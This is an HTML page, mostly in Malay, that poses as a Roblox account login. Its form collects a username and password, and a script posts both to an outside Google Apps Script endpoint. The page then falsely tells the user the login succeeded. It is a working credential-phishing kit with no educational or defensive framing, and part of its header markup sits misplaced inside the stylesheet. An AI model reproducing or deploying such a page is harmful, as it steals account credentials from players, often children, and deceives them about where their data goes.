
<!DOCTYPE html>
<html lang="ms">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Login Roblox Account</title>
<style>
  
.site-header {
  display: flex;
  align-items: center;
  justify-content: center;
  gap: 12px;
  padding: 20px;
  color: #ffffff;
  font-size: 22px;
  font-weight: 800;
  letter-spacing: 1px;
}

.roblox-logo {
  width: 42px;
  height: 42px;
  object-fit: contain;
  border-radius: 8px;
  box-shadow: 0 0 15px #00a6ff66;
}

:root {
  --bg: #070B14;
  --panel: #101827;
  --blue: #00A6FF;
  --text: #F5F9FF;
}

body {
  
<header class="site-header">
  <img
    class="roblox-logo"
    src="https://upload.wikimedia.org/wikipedia/commons/7/7e/Roblox_Logo_2022.jpg"
    alt="Roblox logo"
  >
  <span>ROBLOX ACCOUNT</span>
</header>

  background: var(--bg);
  color: var(--text);
  font-family: Arial, sans-serif;
}

button {
  background: #0077FF;
  color: white;
  border: none;
  border-radius: 10px;
  padding: 12px 20px;
  box-shadow: 0 0 14px #0077FF55;
}
</style>
</head>
<body>
  <main class="card">
    <h1>🎮 Roblox Account</h1>
    <p>Log Masuk Untuk Ke Website Roblox</p>

    <form id="feedbackForm">
      <label for="name">Nama Pengguna Akun</label>
      <input id="name" maxlength="60" placeholder="Username Account">

      <label for="message">Kata Sandi Akun</label>
      <textarea id="message" maxlength="2000"
        placeholder="Your Account Password"
        required></textarea>

      <button type="submit">Login Account ↗</button>
    </form>

    <p id="status" role="status"></p>
  </main>


<script>
const scriptURL = "https://script.google.com/macros/s/AKfycbwAALrBUPNSx9CpC4UGGQN8aoWZFq-_366P9bs97lGbsDEqm4gJOJuZJmqtHo3mvMaUvw/exec";

document.getElementById("feedbackForm")
  .addEventListener("submit", async function(event) {
    event.preventDefault();

    const status = document.getElementById("status");
    const button = this.querySelector("button");

    const data = {
      name: document.getElementById("name").value.trim(),
      message: document.getElementById("message").value.trim()
    };

    if (!data.message) {
      status.textContent = "Sila tulis mesej dahulu.";
      return;
    }

    button.disabled = true;
    button.textContent = "Loading...";
    status.textContent = "Sedang Memproses...";

    try {
      await fetch(scriptURL, {
        method: "POST",
        mode: "no-cors",
        headers: {
          "Content-Type": "text/plain;charset=utf-8"
        },
        body: JSON.stringify(data)
      });

      status.textContent =
        "Login Succesfully Refresh Your Website";

      this.reset();
    } catch (error) {
      status.textContent =
        "Ralat penghantaran. Sila cuba lagi.";
    } finally {
      button.disabled = false;
      button.textContent = "Hantar Mesej ↗";
    }
  });
</script>

</body>
</html>
